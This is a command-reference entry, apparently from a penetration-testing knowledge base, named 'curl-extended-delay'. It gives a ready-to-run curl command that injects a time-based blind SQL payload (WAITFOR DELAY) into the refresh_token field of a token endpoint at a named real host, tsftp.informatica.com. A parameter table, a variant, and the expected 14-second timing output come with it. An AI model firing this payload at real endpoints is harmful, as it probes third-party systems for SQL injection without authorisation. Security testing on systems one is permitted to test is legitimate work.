---
data: >-
  time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept:
  application/json" -H "Content-Type: application/x-www-form-urlencoded" -d
  "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--"
tags:
  - sqli
  - http-test
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:04.822Z'
id: 6824fb87-bc34-45b0-83ea-3f0dfd82dcc4
verified: false
validated: true
submitted: true
---
# curl-extended-delay

## Command

```bash
time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--"
```

## Description

This command performs a timed POST request to confirm SQL injection with a 13-second delay payload in the refresh_token, ideal for validating time-based blind SQLi in API endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Tracks execution duration | Yes |
| `-X POST` | HTTP POST method | Yes |
| `"https://tsftp.informatica.com/api/v1/token"` | API endpoint | Yes |
| `-H "accept: application/json"` | JSON response header | Yes |
| `-H "Content-Type: application/x-www-form-urlencoded"` | Form data encoding | Yes |
| `-d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--"` | Extended SQL delay payload | Yes |

## Examples

### Basic Usage

```bash
time curl -X POST "https://tsftp.informatica.com/api/v1/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:13'--"
```

### Advanced Usage

For custom delays:

```bash
time curl -X POST "https://example.com/api/token" -H "accept: application/json" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&refresh_token='; WAITFOR DELAY '0:0:20'--"
```

## Expected Output

JSON {"error":"invalid_grant"} with timing like "real 0m14.045s", showing the 13-second delay.

## Related

- [[commands/curl-baseline-delay]]
- [[procedures/Confirm-SQL-Injection-with-Extended-Delay]]
